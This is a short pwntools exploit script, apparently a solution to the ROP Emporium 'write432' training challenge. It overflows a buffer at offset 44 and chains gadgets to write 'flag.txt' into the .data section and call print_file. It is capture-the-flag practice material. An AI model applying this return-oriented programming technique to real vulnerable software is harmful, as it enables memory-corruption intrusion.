from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

exe = './write432'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

mov_pEdi_ebp = 0x08048543
print_file = 0x80483d0
data_section = 0x0804a018
pop_edi_ebp_ret = 0x080485aa

# we need overwrite text 'flag.txt' in to .data section
# ebp la thanh ghi 4 bytes nen can chia de ghi de 2 lan 'flag', '.txt'
payload = flat({
    44: [
    	pop_edi_ebp_ret,
    	data_section,   	# data_section -> edi
    	'flag',			# 'flag' -> ebp
    	mov_pEdi_ebp,		# mov data_section, 'flag'
    	# is the same
    	pop_edi_ebp_ret,
    	data_section + 0x4,   # dont want ghi de vao text 'flag'
    	'.txt',			# '.txt' -> ebp
    	mov_pEdi_ebp,		# mov data_section, '.txt'

    	print_file,
    	0x0,				#ret addr
    	data_section
    ]
})
io = start()
write('payload', payload)

io.sendlineafter('>', payload)
io.recvline()

flag = io.recv()
success(flag)